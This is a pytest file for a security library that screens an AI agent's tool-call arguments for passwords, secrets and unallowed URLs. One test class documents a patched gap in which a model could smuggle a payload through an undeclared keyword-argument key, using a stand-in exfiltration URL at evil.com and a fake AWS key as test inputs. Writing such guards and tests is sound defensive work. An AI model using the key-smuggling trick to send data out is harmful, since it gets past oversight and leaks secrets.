"""Tests for the ModelFuzz shield_tool decorator."""

import asyncio
import inspect
import logging

import pytest

from modelfuzz import ModelFuzzBlockError, shield_tool


@shield_tool()
def send_email(to: str, subject: str, body: str) -> str:
    """Pretend tool that sends an email."""
    return f"Email sent to {to} with subject '{subject}'."


@shield_tool
def send_email_bare(to: str, body: str) -> str:
    """Pretend tool decorated with the bare form."""
    return f"Sent to {to}."


@shield_tool()
async def fetch_url(url: str, note: str = "clean") -> str:
    """Pretend async tool."""
    await asyncio.sleep(0)
    return f"fetched {url}"


@shield_tool()
async def stream_rows(query: str):
    """Pretend async-generator tool."""
    for row in ("a", "b"):
        yield f"{query}:{row}"


class TestShieldToolDecorator:
    """Tests for the shield_tool decorator."""

    def test_malicious_call_raises_block_error(self):
        """Assert that a malicious call raises ModelFuzzBlockError."""
        malicious_body = "My password is 12345"
        with pytest.raises(ModelFuzzBlockError):
            send_email("alice@example.com", "Hello", malicious_body)

    def test_safe_call_executes_successfully(self):
        """Assert that a safe call executes successfully and returns the correct output."""
        safe_body = "Hi Alice, how are you?"
        result = send_email("alice@example.com", "Hello", safe_body)
        assert result == "Email sent to alice@example.com with subject 'Hello'."

    def test_decorator_preserves_metadata(self):
        """Assert that the decorator preserves the function's metadata."""
        assert send_email.__name__ == "send_email"
        assert send_email.__doc__ == "Pretend tool that sends an email."

    def test_blocks_violation_passed_as_keyword(self):
        """Keyword arguments are checked, not just positional ones."""
        with pytest.raises(ModelFuzzBlockError):
            send_email(to="alice@example.com", subject="Hello", body="my password is 12345")

    def test_blocks_violation_in_mixed_args(self):
        """A violation in a keyword arg is caught alongside clean positional args."""
        with pytest.raises(ModelFuzzBlockError):
            send_email("alice@example.com", "Hello", body="the secret is out")

    def test_bare_decorator_form_blocks(self):
        """The bare @shield_tool form applies the default engine."""
        with pytest.raises(ModelFuzzBlockError):
            send_email_bare("alice@example.com", "my password is 12345")
        assert send_email_bare("alice@example.com", "hi") == "Sent to alice@example.com."


class TestStdoutIsNotTouched:
    """A library must not write to stdout: it is the MCP stdio transport."""

    def test_allowed_call_writes_nothing_to_stdout(self, capsys):
        """An allowed call leaves stdout completely empty."""
        send_email("alice@example.com", "Hello", "Hi Alice, how are you?")
        captured = capsys.readouterr()
        assert captured.out == ""
        assert captured.err == ""

    def test_blocked_call_writes_nothing_to_stdout(self, capsys):
        """A blocked call also leaves stdout empty -- it logs instead."""
        with pytest.raises(ModelFuzzBlockError):
            send_email("alice@example.com", "Hello", "my password is 12345")
        assert capsys.readouterr().out == ""


class TestBlockIsLogged:
    """Blocks are the audit record, so they must be logged."""

    def test_block_logs_warning_with_structured_fields(self, caplog):
        """A block emits a WARNING carrying the tool, rule and reason."""
        with (
            caplog.at_level(logging.WARNING, logger="modelfuzz"),
            pytest.raises(ModelFuzzBlockError),
        ):
            send_email("alice@example.com", "Hello", "my password is 12345")

        assert len(caplog.records) == 1
        record = caplog.records[0]
        assert record.levelno == logging.WARNING
        assert record.modelfuzz_tool == "send_email"
        assert record.modelfuzz_rule == "SensitiveDataFilter"
        assert "password" in record.modelfuzz_reason

    def test_allowed_call_logs_no_warning(self, caplog):
        """An allowed call produces no WARNING."""
        with caplog.at_level(logging.WARNING, logger="modelfuzz"):
            send_email("alice@example.com", "Hello", "Hi Alice, how are you?")
        assert caplog.records == []


class TestAsyncTools:
    """Coroutine functions must stay coroutine functions once shielded."""

    def test_wrapped_coroutine_is_still_a_coroutine_function(self):
        """Frameworks branch on this to decide whether to await."""
        assert inspect.iscoroutinefunction(fetch_url)

    def test_async_safe_call_returns_the_real_value(self):
        """An awaited safe call returns the tool's value, not a coroutine."""
        result = asyncio.run(fetch_url("http://example.com"))
        assert result == "fetched http://example.com"

    def test_async_malicious_call_raises(self):
        """A violation in an async tool raises ModelFuzzBlockError."""
        with pytest.raises(ModelFuzzBlockError):
            asyncio.run(fetch_url("http://example.com", note="my password is 12345"))

    def test_async_block_happens_before_the_body_runs(self):
        """The body must never execute when a policy trips."""
        ran = []

        @shield_tool()
        async def tool(payload: str) -> str:
            ran.append(payload)
            return "done"

        with pytest.raises(ModelFuzzBlockError):
            asyncio.run(tool("the secret is out"))
        assert ran == []

    def test_wrapped_async_generator_is_still_an_async_generator(self):
        """Async-generator tools keep their kind too."""
        assert inspect.isasyncgenfunction(stream_rows)

    def test_async_generator_safe_call_yields(self):
        """A safe async-generator call yields its rows."""

        async def collect():
            return [row async for row in stream_rows("q")]

        assert asyncio.run(collect()) == ["q:a", "q:b"]

    def test_async_generator_malicious_call_raises(self):
        """A violation in an async-generator tool raises on iteration."""

        async def collect():
            return [row async for row in stream_rows("my password is 12345")]

        with pytest.raises(ModelFuzzBlockError):
            asyncio.run(collect())


class TestUndeclaredKwargKeysAreChecked:
    """A tool declaring **kwargs lets the caller choose the key names.

    _enforce iterated kwargs.values() only, so for any tool with a **kwargs
    parameter the entire payload could be smuggled in the key -- and JSON
    permits arbitrary keys, so a model can emit one. The same dict passed as a
    *value* was blocked, which is what made the gap invisible.
    """

    def test_a_url_in_an_undeclared_kwarg_key_is_blocked(self):
        from modelfuzz import ModelFuzzBlockError, PolicyEngine, URLAllowList, shield_tool

        engine = PolicyEngine([URLAllowList(allowed_domains=["api.internal.com"])])
        ran = []

        @shield_tool(engine=engine)
        def http_get(**params: object) -> str:
            ran.append(params)
            return "ran"

        with pytest.raises(ModelFuzzBlockError):
            http_get(**{"http://evil.com/exfil?d=1": "x"})
        assert ran == []

    def test_a_credential_in_an_undeclared_kwarg_key_is_blocked(self):
        from modelfuzz import ModelFuzzBlockError, PolicyEngine, SecretPatternFilter, shield_tool

        engine = PolicyEngine([SecretPatternFilter()])

        @shield_tool(engine=engine)
        def db_query(table: str, **filters: object) -> str:
            return "ran"

        with pytest.raises(ModelFuzzBlockError):
            db_query("users", **{"AKIA" + "IOSFODNN7EXAMPLE": 1})

    def test_declared_parameter_names_are_not_checked(self):
        """The tool author picks these, not the model.

        Checking them would make the bundled SensitiveDataFilter block any tool
        that merely has a parameter called `password` or `api_key`.
        """
        from modelfuzz import shield_tool

        @shield_tool()
        def login(password: str = "", api_key: str = "") -> str:
            return "ran"

        assert login(password="x", api_key="y") == "ran"

    def test_ordinary_undeclared_keys_still_pass(self):
        from modelfuzz import PolicyEngine, URLAllowList, shield_tool

        engine = PolicyEngine([URLAllowList(allowed_domains=["api.internal.com"])])

        @shield_tool(engine=engine)
        def http_get(**params: object) -> str:
            return "ran"

        assert http_get(limit=10, order="asc") == "ran"

    def test_values_are_still_checked(self):
        """The pre-existing behaviour must be untouched."""
        from modelfuzz import ModelFuzzBlockError, PolicyEngine, URLAllowList, shield_tool

        engine = PolicyEngine([URLAllowList(allowed_domains=["api.internal.com"])])

        @shield_tool(engine=engine)
        def http_get(**params: object) -> str:
            return "ran"

        with pytest.raises(ModelFuzzBlockError):
            http_get(callback="http://evil.com")
